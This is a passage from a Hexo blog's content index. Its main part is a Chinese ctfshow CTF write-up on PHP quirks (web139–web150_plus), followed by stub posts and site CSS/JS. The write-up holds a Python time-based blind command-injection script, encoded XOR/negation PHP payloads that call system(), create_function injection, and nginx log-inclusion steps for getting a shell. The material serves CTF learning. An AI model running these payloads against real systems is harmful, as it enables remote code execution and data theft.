class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;   #cut是截断的意思，第一个括号是代表截断第几个字符 awk &#x27;NR==&#123;&#125;&#x27; 是查看第几行  最后一个&#123;&#125;代表着遇到哪个字符就截断</span></span><br><span class="line"><span class="comment"># payload的含义是，如果遇到该截断的字符，就会延时3秒，并进行截断。</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">#row=6</span></span><br><span class="line">length=<span class="number">48</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,row):</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++第&quot;+str(c)+&quot;个字符&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,s)    <span class="comment">#format()里面填的东西是上面payload&#123;&#125;中的东西</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#如果请求在3秒之内完成就结束，如果超过3秒就会代表执行了sleep 4，就会执行下面的except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223180716378.png" alt="image-20221223180716378"></p><p>把flag复制下来，然后把空格去掉，补上{}就能拿到flag了。</p><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182022441.png" alt="image-20221223182022441"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路就是让$code等于0，因为是弱类型比较，所以可以让0==&#x27;ctfshow&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182148022.png" alt="image-20221223182148022"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=system&amp;f2=system   把system换成var_dump也行    exec/usleep也行，应该有很多，可以自己去试试</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223202331719.png" alt="image-20221223202331719"></p><p>这里在本地试了下，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1+phpinfo()+1 ---&gt; 是可以执行出来的，所以这道题也可以利用这一特点， </span><br><span class="line">if(preg_match(&#x27;/^\W+$/&#x27;, $v3))  ----&gt;这个是正则的意思是不能含有字母，所以我们就可以通过异或来获取字母了。</span><br><span class="line">/^\W+$/ 作用是匹配非数字字母下划线的字符</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3=%2b(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)%2b</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure><p>无数字字母绕过正则表达式总结    yu师傅写的</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a>  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205123698.png" alt="image-20221223205123698"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205156267.png" alt="image-20221223205156267"></p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205353234.png" alt="image-20221223205353234"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205452667.png" alt="image-20221223205452667"></p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205853208.png" alt="image-20221223205853208"></p><p>和web141差不多</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210018653.png" alt="image-20221223210018653"></p><p>用web141的payload，然后把%2b换成*号就行</p><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210505198.png" alt="image-20221223210505198"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是不一定得是这种格式  1+phpinfo()+1   1+1+phpinfo()这种形式也行</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=-(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)&amp;v3=1</span><br><span class="line"></span><br><span class="line">//  就是11-xxxxxx</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210903738.png" alt="image-20221223210903738"></p><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211005710.png" alt="image-20221223211005710"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211416842.png" alt="image-20221223211416842"></p><p>就是其他加减乘除异或符号全被过滤了，但是在本地试了下  |没有被过滤，所以还是可以用的</p><p>但是取反没有被过滤，所以可以尝试来解</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|</span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211955658.png" alt="image-20221223211955658"></p><p>用上一题的payload直接就可以打通关了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212053007.png" alt="image-20221223212053007"></p><p>前面给过yu师傅写的构造方法了，这里在给一下</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212251086.png" alt="image-20221223212251086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的正则是第一个字符不能是数字字母 所以可以用   \   绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于第一个参数为空，那么我们就得考虑去找一个能执行第一个参数为空的函数了，那么create_functino()就可以</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213534323.png" alt="image-20221223213534323"></p><p>这里的思路是用}先把第一个if给包含住，然后在进行rce，后面的{是为了把下一行的}给包含住，#是为了把);给注释掉。</p><p>然后就可以进行rce了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213759296.png" alt="image-20221223213759296"></p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214111128.png" alt="image-20221223214111128"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214505853.png" alt="image-20221223214505853"></p><p>本地试过了，这样也可以执行，那么就可以构造get_ctfshow_fl0g()</p><p>这是解法1</p><p><strong>解法二</strong></p><p>直接可以在eval里进行命令执行</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214653400.png" alt="image-20221223214653400"></p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221028213.png" alt="image-20221223221028213"></p><p>这里不能用其他文件来新建的原因是unlink函数会把其他函数给删除掉</p><p>所以只能覆盖掉index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221205356.png" alt="image-20221223221205356"></p><p>然后在访问index.php，进行post  rce 就能拿到flag了。</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224145925518.png" alt="image-20221224145925518"></p><p>这道题可以用文件包含日志 /var/log/nginx/access.log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是因为$key为url/?后面的东西，那么在extract($_GET);传isVIP的时候，就要注意不能传有关正则匹配中的东西，不然的话就会代码就会执行结束。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的post传ctf的时候不含:就行，那么只要符合上述条件就行了。</span><br></pre></td></tr></table></figure><p>这里就可以考虑文件包含日志了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224150819031.png" alt="image-20221224150819031"></p><p>服务器是nginx的，那么就利用nginx的默认日志路径</p><p>只有一次机会，写错了就得重新开环境。</p><p><strong>第一步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224151001019.png" alt="image-20221224151001019"></p><p><strong>第二步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194408896.png" alt="image-20221224194408896"></p><p><strong>第三步</strong></p><p>进行rce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194509564.png" alt="image-20221224194509564"></p><p>拿到flag.</p><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194638649.png" alt="image-20221224194638649"></p><p>这里不给用日志包含了</p><p><strong>题解释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个题一点点小坑__autoload()函数不是类里面的</span><br><span class="line">__autoload — 尝试加载未定义的类</span><br><span class="line">最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦</span><br><span class="line">原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用</span><br><span class="line">__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo</span><br><span class="line">接下来就去getshell啦</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195350241.png" alt="image-20221224195350241"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195525809.png" alt="image-20221224195525809"></p><p>直接拿到flag.</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow PHP特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记录</title>
      <link href="/posts/71cd69a5.html"/>
      <url>/posts/71cd69a5.html</url>
      
        <content type="html"><![CDATA[<p>之前也是写在了csdn上。</p><p><a href="https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298">https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow命令执行 刷题记录</title>
      <link href="/posts/ae291e13.html"/>
      <url>/posts/ae291e13.html</url>
      
        <content type="html"><![CDATA[<p>之前写在了csdn上</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128285071">https://blog.csdn.net/qq_63548648/article/details/128285071</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow信息收集 刷题记录</title>
      <link href="/posts/de341b7.html"/>
      <url>/posts/de341b7.html</url>
      
        <content type="html"><![CDATA[<p>之前也是写在了csdn.</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128244465">https://blog.csdn.net/qq_63548648/article/details/128244465</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow爆破 刷题记录</title>
      <link href="/posts/1a5a0558.html"/>
      <url>/posts/1a5a0558.html</url>
      
        <content type="html"><![CDATA[<p>之前没建博客之前，写在了csdn,所以这里就直接用csdn的链接了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_63548648/article/details/128276536</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="../images/image-20221226161738079.png" alt="image-20221226161738079"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"ke1nys`Blog","short_name":"ke1nys","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/siteicon/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/siteicon/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/siteicon/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/siteicon/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/siteicon/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/siteicon/144.png","sizes":"144x144","type":"image/png"},{"src":"/img/siteicon/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.js"/>
      <url>/js/runtime/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime() { var t = new Date("12/16/2022 00:00:00"); now.setTime(now.getTime() + 250); var e = (now - t) / 1e3 / 60 / 60 / 24, a = Math.floor(e), n = (now - t) / 1e3 / 60 / 60 - 24 * a, r = Math.floor(n); 1 == String(r).length && (r = "0" + r); var s = (now - t) / 1e3 / 60 - 1440 * a - 60 * r, i = Math.floor(s); 1 == String(i).length && (i = "0" + i); var o = (now - t) / 1e3 - 86400 * a - 3600 * r - 60 * i, l = Math.round(o); 1 == String(l).length && (l = "0" + l); let g = ""; g = r < 18 && r >= 9 ? `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>` : `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = g) } setInterval((() => { createtime() }), 250);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {    font-family: ZhuZiAYuanJWD;    src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);    font-display: swap;    font-weight: lighter;  }    div#menus {    font-family: "ZhuZiAYuanJWD";  }  h1#site-title {    font-family: ZhuZiAYuanJWD;    font-size: 3em !important;  }  a.article-title,  a.blog-slider__title,  a.categoryBar-list-link,  h1.post-title {    font-family: ZhuZiAYuanJWD;  }    .iconfont {    font-family: "iconfont" !important;    font-size: 3em;    /* 可以定义图标大小 */    font-style: normal;    -webkit-font-smoothing: antialiased;    -moz-osx-font-smoothing: grayscale;  }    /* 时间轴生肖icon */  svg.icon {    /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */    width: 1em;    height: 1em;    /* width和height定义图标的默认宽度和高度*/    vertical-align: -0.15em;    fill: currentColor;    overflow: hidden;  }    .icon-zhongbiao::before {    color: #f7c768;  }    /* bilibli番剧插件 */  #article-container .bangumi-tab.bangumi-active {    background: var(--anzhiyu-theme);    color: var(--anzhiyu-ahoverbg);    border-radius: 10px;  }  a.bangumi-tab:hover {    text-decoration: none !important;  }  .bangumi-button:hover {    background: var(--anzhiyu-theme) !important;    border-radius: 10px !important;    color: var(--anzhiyu-ahoverbg) !important;  }  a.bangumi-button.bangumi-nextpage:hover {    text-decoration: none !important;  }  .bangumi-button {    padding: 5px 10px !important;  }    a.bangumi-tab {    padding: 5px 10px !important;  }  svg.icon.faa-tada {    font-size: 1.1em;  }  .bangumi-info-item {    border-right: 1px solid #f2b94b;  }  .bangumi-info-item span {    color: #f2b94b;  }  .bangumi-info-item em {    color: #f2b94b;  }    /* 解决artitalk的图标问题 */  #uploadSource > svg {    width: 1.19em;    height: 1.5em;  }    /*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */  #page-header:not(.not-top-img):before {    background-color: transparent !important;  }    /* 首页文章卡片 */  #recent-posts > .recent-post-item {    background: rgba(255, 255, 255, 0.9);  }    /* 首页侧栏卡片 */  #aside-content .card-widget {    background: rgba(255, 255, 255, 0.9);  }    /* 文章页面正文背景 */  div#post {    background: rgba(255, 255, 255, 0.9);  }    /* 分页页面 */  div#page {    background: rgba(255, 255, 255, 0.9);  }    /* 归档页面 */  div#archive {    background: rgba(255, 255, 255, 0.9);  }    /* 标签页面 */  div#tag {    background: rgba(255, 255, 255, 0.9);  }    /* 分类页面 */  div#category {    background: rgba(255, 255, 255, 0.9);  }    /*夜间模式伪类遮罩层透明*/  [data-theme="dark"] #recent-posts > .recent-post-item {    background: #121212;  }    [data-theme="dark"] .card-widget {    background: #121212 !important;  }    [data-theme="dark"] div#post {    background: #121212 !important;  }    [data-theme="dark"] div#tag {    background: #121212 !important;  }    [data-theme="dark"] div#archive {    background: #121212 !important;  }    [data-theme="dark"] div#page {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: transparent !important;  }  /* 页脚透明 */  #footer {    background: transparent !important;  }    /* 头图透明 */  #page-header {    background: transparent !important;  }    #rightside > div > button {    border-radius: 5px;  }    /* 滚动条 */    ::-webkit-scrollbar {    width: 10px;    height: 10px;  }    ::-webkit-scrollbar-thumb {    background-color: #3b70fc;    border-radius: 2em;  }    ::-webkit-scrollbar-corner {    background-color: transparent;  }    ::-moz-selection {    color: #fff;    background-color: #3b70fc;  }    /* 音乐播放器 */    /* .aplayer .aplayer-lrc {    display: none !important;  } */    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    transition: all 0.3s;    /* 默认情况下缩进左侧66px，只留一点箭头部分 */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    transition: all 0.3s;    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */  }    .aplayer.aplayer-fixed {    z-index: 999999 !important;  }    /* 评论框  */  .vwrap {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 30px 0px;  }    /* 设置评论框 */    .vcard {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 0px 0px;  }    /* 鼠标图标 */  body {    cursor: url("/img/x1.cur"), auto;  }  a,  [type="button"]:not(:disabled),  [type="reset"]:not(:disabled),  [type="submit"]:not(:disabled),  button:not(:disabled) {    cursor: url("/img/x2.cur"), auto !important;  }  /* md网站下划线 */  #article-container a:hover {    text-decoration: none !important;  }    #article-container #hpp_talk p img {    display: inline;  }    /* 404页面 */  #error-wrap {    position: absolute;    top: 40%;    right: 0;    left: 0;    margin: 0 auto;    padding: 0 1rem;    max-width: 1000px;    transform: translate(0, -50%);  }    #error-wrap .error-content {    display: flex;    flex-direction: row;    justify-content: center;    align-items: center;    margin: 0 1rem;    height: 18rem;    border-radius: 8px;    background: var(--card-bg);    box-shadow: var(--card-box-shadow);    transition: all 0.3s;  }    #error-wrap .error-content .error-img {    box-flex: 1;    flex: 1;    height: 100%;    border-top-left-radius: 8px;    border-bottom-left-radius: 8px;    background-color: #3b70fc;    background-position: center;    background-size: cover;  }    #error-wrap .error-content .error-info {    box-flex: 1;    flex: 1;    padding: 0.5rem;    text-align: center;    font-size: 14px;    font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;  }  #error-wrap .error-content .error-info .error_title {    margin-top: -4rem;    font-size: 9em;  }  #error-wrap .error-content .error-info .error_subtitle {    margin-top: -3.5rem;    word-break: break-word;    font-size: 1.6em;  }  #error-wrap .error-content .error-info a {    display: inline-block;    margin-top: 0.5rem;    padding: 0.3rem 1.5rem;    background: var(--btn-bg);    color: var(--btn-color);  }    #body-wrap.error .aside-list {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    bottom: 0px;    position: absolute;    padding: 1rem;    width: 100%;    overflow: scroll;  }    #body-wrap.error .aside-list .aside-list-group {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    max-width: 1200px;    margin: 0 auto;  }    #body-wrap.error .aside-list .aside-list-item {    padding: 0.5rem;  }    #body-wrap.error .aside-list .aside-list-item img {    width: 100%;    object-fit: cover;    border-radius: 12px;  }    #body-wrap.error .aside-list .aside-list-item .thumbnail {    overflow: hidden;    width: 230px;    height: 143px;    background: var(--anzhiyu-card-bg);    display: flex;  }    #body-wrap.error .aside-list .aside-list-item .content .title {    -webkit-line-clamp: 2;    overflow: hidden;    display: -webkit-box;    -webkit-box-orient: vertical;    line-height: 1.5;    justify-content: center;    align-items: flex-end;    align-content: center;    padding-top: 0.5rem;    color: white;  }    #body-wrap.error .aside-list .aside-list-item .content time {    display: none;  }    /* 代码框主题 */  #article-container figure.highlight {    border-radius: 10px;  }]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.min.js"/>
      <url>/js/runtime/runtime.min.js</url>
      
